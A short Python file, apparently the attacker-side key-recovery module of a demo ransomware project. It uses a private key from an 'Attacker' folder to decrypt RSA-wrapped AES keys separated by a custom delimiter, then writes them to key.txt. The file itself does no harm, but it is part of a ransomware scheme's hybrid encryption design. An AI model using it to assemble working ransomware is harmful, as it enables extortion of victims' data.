import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


def get_encrypted_keys(path):
    encrypted_keys = None
    with open(path, "rb") as f:
        encrypted_keys = f.read().split(str.encode('~@*@~'*30))
    return encrypted_keys[:-1]


def generate_aes_key_file(aes_keys):
    with open("key.txt", "wb") as f:
        for aes_key in aes_keys:
            f.write(aes_key)
            f.write(str.encode('~@*@~'*30))


def create_attachment(file_path):
    keys = get_encrypted_keys(file_path)

    decrypted_keys = []
    for key in keys:
        priv_key = open('../Attacker/irritating-doggo_private.pem', "r").read()
        rsakey = PKCS1_OAEP.new(RSA.importKey(priv_key))
        decrypted_keys.append(rsakey.decrypt(key))

    generate_aes_key_file(decrypted_keys)

